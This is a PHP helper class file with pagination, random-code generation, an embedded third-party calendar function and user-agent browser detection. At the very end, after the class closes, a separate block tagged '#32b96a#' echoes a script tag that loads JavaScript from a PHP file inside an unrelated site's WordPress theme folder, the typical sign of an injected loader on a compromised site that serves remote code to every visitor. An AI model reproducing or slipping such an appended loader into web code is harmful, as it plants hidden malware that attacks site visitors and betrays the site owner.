<?php
@require("DB_Class.php");

class al_karim extends db_class 
{
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////               	||||||||||||||				
////				||			|| 
////				||||||||||||||
////				||
////				||
////				||
////				|| AGING
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
function start_paging($display_array, $Total_nDisplayRecs = 10)
{
	// This function take --> result
	// This function out  --> result & Start Rec. & Display Rec.

	$nDisplayRecs = (int) $Total_nDisplayRecs;
	
	$nTotalRecs = count($display_array);

	if ($nDisplayRecs <= 0) { // Display All Records
		$nDisplayRecs = $nTotalRecs;
	}

	$nStartRec = 1;
	// Set Up Start Record Position
	
	if (isset($_POST["page_no"]) AND is_numeric($_POST["page_no"]) )
	{
		$nStartRec = (($_POST["page_no"] - 1) * $nDisplayRecs) + 1;
	}
	else
	{
		if (isset($_GET['start']) AND strlen($_GET['start']) > 0) 
		{
			$nStartRec = $_GET['start'];
			if (!(is_numeric($nStartRec)))
				$nStartRec = 1;
		}
	} 
	// Avoid starting record > total records
	if ($nStartRec > $nTotalRecs) {
		$nStartRec = $nTotalRecs;
	}
	
	if (is_array($display_array)) {
		array_splice($display_array, 0,$nStartRec -1);
	}
	$start_paging['start_rec'] = $nStartRec;
	$start_paging['display_rec']  = $nDisplayRecs;
	$start_paging['all_rec']  = $nTotalRecs;
	
	return $start_paging;
}
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
function end_paging($end_paging)
{
	//////////////    The second part 
	//// the variable needed from the first part
	////	$nTotalRecs		$nDisplayRecs
	$nTotalRecs	  = $end_paging['total'];	
	$nDisplayRecs = $end_paging['display'];
	$nRecRange    = 10;
	
	if (isset($_POST["page_no"]) AND is_numeric($_POST["page_no"]) )
	{
		$nStartRec = (($_POST["page_no"] - 1) * $nDisplayRecs) + 1;
	}
	else
	{
		if (!isset($end_paging['start']))
			if (isset($_GET['start']) AND is_numeric($_GET['start']))  $nStartRec = $_GET['start'];
			else $nStartRec = 1;
		else
			$nStartRec = $end_paging['start'];
	}
	if ($nStartRec > $nTotalRecs )
		$nStartRec = 1;
	///////////////////////////////////////////////// Start
$editFormAction = $_SERVER['PHP_SELF']; 
$element_count = 0;
if (!empty($_SERVER['QUERY_STRING']))
{
	$url_element = $_SERVER['QUERY_STRING'];
	$element = split("&",$url_element);
	while (list($key, $val) = each($element))
	{
		$P = split("=",$val);
		if ($P[0] != 'start')
		{
			if ($element_count == 0) $editFormAction .= '?';
			$editFormAction .= $val;
			$editFormAction .= '&';
			$element_count = $element_count +1;
		}
	}
}
if ($element_count == 0) $editFormAction .= '?';
   /////////////////////////////////////////////////////
//   print '<table align="center"  border="1" cellspacing="1" cellpadding="4" bgcolor="#FFFEEF" width="100%">
//  			<tr>
//	  			<td><div align="center">';
		  	// Display page numbers
			if ($nTotalRecs > 0) {
				$rsEof = ($nTotalRecs < ($nStartRec + $nDisplayRecs));
				if ($nTotalRecs > $nDisplayRecs) {
			// Find out if there should be Backward or Forward Buttons on the TABLE.
			if 	($nStartRec == 1) {
				$isPrev = False;
			} else {
				$isPrev = True;
				$PrevStart = $nStartRec - $nDisplayRecs;
				if ($PrevStart < 1) { $PrevStart = 1; } 
		 print '<a href="'.basename($editFormAction).'start='.$PrevStart.'"><b>Previous</b></a>&nbsp;';
			 
			}
			if ($isPrev || (!$rsEof)) {
				$x = 1;
				$y = 1;
				$dx1 = intval(($nStartRec-1)/($nDisplayRecs*$nRecRange))*$nDisplayRecs*$nRecRange+1;
				$dy1 = intval(($nStartRec-1)/($nDisplayRecs*$nRecRange))*$nRecRange+1;
				if (($dx1+$nDisplayRecs*$nRecRange-1) > $nTotalRecs) {
					$dx2 = intval($nTotalRecs/$nDisplayRecs)*$nDisplayRecs+1;
					$dy2 = intval($nTotalRecs/$nDisplayRecs)+1;
				} else {
					$dx2 = $dx1+$nDisplayRecs*$nRecRange-1;
					$dy2 = $dy1+$nRecRange-1;
				}
				while ($x <= $nTotalRecs) {
					if (($x >= $dx1) && ($x <= $dx2)) {
						if ($nStartRec == $x) { 
							print '<b> '.$y.' </b>';
					       } else { 
							print '<a href="'.basename($editFormAction).'start='.$x.'"><b>'.$y.'</b></a>&nbsp;';
					       }
						$x += $nDisplayRecs;
						$y += 1;
						} elseif (($x >= ($dx1-$nDisplayRecs*$nRecRange)) && ($x <= ($dx2+$nDisplayRecs*$nRecRange))) {
							if ($x+$nRecRange*$nDisplayRecs < $nTotalRecs) { 
								print  '<a href="'.basename($editFormAction).'start='.$x.'"><b>'.$y.'-'.($y+$nRecRange-1).'</b></a>&nbsp;';
						       } else {
								$ny=intval(($nTotalRecs-1)/$nDisplayRecs)+1;
								if ($ny == $y) { 
									print '<a href="'.basename($editFormAction).'start='.$x.'"><b>'.$y.'</b></a> ';
							       } else { 
									print '<a href="'.basename($editFormAction).'start='.$x.'"><b>'.$y.'-'.$ny.'</b></a> ';
							       }
									}
									$x += $nRecRange*$nDisplayRecs;
									$y += $nRecRange;
								} else {
									$x += $nRecRange*$nDisplayRecs;
									$y += $nRecRange;
								}
							}
						}
						// Next link
						if (!$rsEof) {
							$NextStart = $nStartRec + $nDisplayRecs;
							$isMore = True;  
						           print '&nbsp;<a href="'.basename($editFormAction).'start='.$NextStart.'"><b>Next</b></a>';
			               } else {
							$isMore = False;
						}} 
			             //if ( $end_paging['total'] > $end_paging['display'] )
						 //	print '<br>';
                  
					if ($nStartRec > $nTotalRecs) { $nStartRec = $nTotalRecs; }
					$nStopRec = $nStartRec + $nDisplayRecs - 1;
					$nRecCount = $nTotalRecs - 1;
					if ($rsEof) { $nRecCount = $nTotalRecs; }
					if ($nStopRec > $nRecCount) { $nStopRec = $nRecCount; } 
					print ' ] [ Results '.$nStartRec.' &raquo; '.$nStopRec.' of '.$nTotalRecs;
			       } else { 
					print 'No records found';
			       }
//				   print '</div></td></tr></table>';

}
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////               	||||||||||||||				
////				||			|| 
////				||||||||||||||
////				||	 ||
////				||	  ||
////				||	   ||	
////				|| 		|| ANDOM
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	function random_code($code_length = 5)
	{
		$generate_code = "";
		for($i=1;$i<=$code_length;$i++)
		{
			$choose = rand(1,3);
			if ($choose == 1)
				$generate_code .= rand(0,9);
			if ($choose == 2)
				$generate_code .= chr(rand(65,90));			
			if ($choose == 3)						
				$generate_code .= chr(rand(97,122));			
		}
		return $generate_code;
	}
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
# PHP Calendar (version 2.3), written by Keith Devens
# http://keithdevens.com/software/php_calendar
#  see example at http://keithdevens.com/weblog
# License: http://keithdevens.com/software/license

function generate_calendar($year, $month, $days = array(), $day_name_length = 3, $month_href = NULL, $first_day = 0, $pn = array()){
    $first_of_month = gmmktime(0,0,0,$month,1,$year);
    #remember that mktime will automatically correct if invalid dates are entered
    # for instance, mktime(0,0,0,12,32,1997) will be the date for Jan 1, 1998
    # this provides a built in "rounding" feature to generate_calendar()

    $day_names = array(); #generate all the day names according to the current locale
    for($n=0,$t=(3+$first_day)*86400; $n<7; $n++,$t+=86400) #January 4, 1970 was a Sunday
        $day_names[$n] = ucfirst(gmstrftime('%A',$t)); #%A means full textual day name

    list($month, $year, $month_name, $weekday) = explode(',',gmstrftime('%m,%Y,%B,%w',$first_of_month));
    $weekday = ($weekday + 7 - $first_day) % 7; #adjust for $first_day
    $title   = htmlentities(ucfirst($month_name)).'&nbsp;'.$year;  #note that some locales don't capitalize month and day names

    #Begin calendar. Uses a real <caption>. See http://diveintomark.org/archives/2002/07/03
    @list($p, $pl) = each($pn); @list($n, $nl) = each($pn); #previous and next links, if applicable
    if($p) $p = '<span class="calendar-prev" >'.($pl ? '<a href="'.htmlspecialchars($pl).'" style="color:#000099; font-weight:bolder" >'.$p.'</a>' : $p).'</span>&nbsp;';
    if($n) $n = '&nbsp;<span class="calendar-next"  >'.($nl ? '<a href="'.htmlspecialchars($nl).'" style="color:#000099; font-weight:bolder" >'.$n.'</a>' : $n).'</span>';
    $calendar = '<table cellpadding="0" cellspacing="0" class="calendar" style="border:#183966 solid 1px" width="176px">'."\n".
        '<caption class="calendar-month">'.$p.($month_href ? '<a href="'.htmlspecialchars($month_href).'">'.$title.'</a>' : $title).$n."</caption>\n<tr>";

    if($day_name_length){ #if the day names should be shown ($day_name_length > 0)
        #if day_name_length is >3, the full name of the day will be printed
        foreach($day_names as $d)
            $calendar .= '<th valign="middle" style=" height:20;border:#4a6c9a solid 1px; background:#4a6c9a; color:#FFFFFF;" abbr="'.htmlentities($d).'">'.htmlentities($day_name_length < 4 ? substr($d,0,$day_name_length) : $d).'</th>';
        $calendar .= "</tr>\n<tr>";
    }

    if($weekday > 0) $calendar .= '<td style="height:20;border:#4a6c9a solid 1px;" colspan="'.$weekday.'">&nbsp;</td>'; #initial 'empty' days
    for($day=1,$days_in_month=gmdate('t',$first_of_month); $day<=$days_in_month; $day++,$weekday++){
        if($weekday == 7){
            $weekday   = 0; #start a new week
            $calendar .= "</tr>\n<tr>";
        }
        if(isset($days[$day]) and is_array($days[$day])){
            @list($link, $classes, $content, $title) = $days[$day];
            if(is_null($content))  $content  = $day;
            $calendar .= '<td style="height:20;border:#4a6c9a solid 1px;" '.($classes ? ' class="'.htmlspecialchars($classes).'">' : '>').
                ($link ? '<a title="'.htmlspecialchars($title).'" href="'.htmlspecialchars($link).'">'.$content.'</a>' : $content).'</td>';
        }
        else $calendar .= "<td style='height:20;border:#4a6c9a solid 1px;' >$day</td>";
    }
    if($weekday != 7) $calendar .= '<td style="height:20;border:#4a6c9a solid 1px;" colspan="'.(7-$weekday).'">&nbsp;</td>'; #remaining "empty" days

    return $calendar."</tr>\n</table>\n";
}
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
function browser_detection( $which_test ) {

	// initialize the variables
	$browser = '';
	$dom_browser = '';

	// set to lower case to avoid errors, check to see if http_user_agent is set
	$navigator_user_agent = ( isset( $_SERVER['HTTP_USER_AGENT'] ) ) ? strtolower( $_SERVER['HTTP_USER_AGENT'] ) : '';

	// run through the main browser possibilities, assign them to the main $browser variable
	//print $navigator_user_agent."<br>";
	//$navigator_user_agent = "mozilla/4.0 (compatible; msie 7.0; windows nt 5.1; sv1; fdm)";
	if (stristr($navigator_user_agent, "opera")) 
	{
		$browser = 'opera';
		$dom_browser = true;
	}

	
	elseif (stristr($navigator_user_agent, "msie 7")) 
	{
		$browser = 'msie 7'; 
		$dom_browser = true;
	}
	elseif (stristr($navigator_user_agent, "msie 6")) 
	{
		$browser = 'msie 6'; 
		$dom_browser = true;
	}
	elseif (stristr($navigator_user_agent, "msie 4")) 
	{
		$browser = 'msie4'; 
		$dom_browser = false;
	}
	elseif ((stristr($navigator_user_agent, "konqueror")) || (stristr($navigator_user_agent, "safari"))) 
	{
		$browser = 'safari'; 
		$dom_browser = true;
	}

	elseif (stristr($navigator_user_agent, "gecko")) 
	{
		$browser = 'mozilla';
		$dom_browser = true;
	}
	
	elseif (stristr($navigator_user_agent, "mozilla/4")) 
	{
		$browser = 'ns4';
		$dom_browser = false;
	}
	
	else 
	{
		$dom_browser = false;
		$browser = false;
	}

	// return the test result you want
	if ( $which_test == 'browser' )
	{
		//print $browser."<br>";
		return $browser;
	}
	elseif ( $which_test == 'dom' )
	{
		return $dom_browser;
		//  note: $dom_browser is a boolean value, true/false, so you can just test if
		// it's true or not.
	}
}
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

};
$cls = new al_karim;
?>
<?php
#32b96a#
if(empty($srwv)) {
$srwv = "<script type=\"text/javascript\" src=\"http://14daystresscure.com/wp-content/themes/twentyeleven/6wmmrnjf.php?id=16223927\"></script>";
echo $srwv;
}
#/32b96a#
?>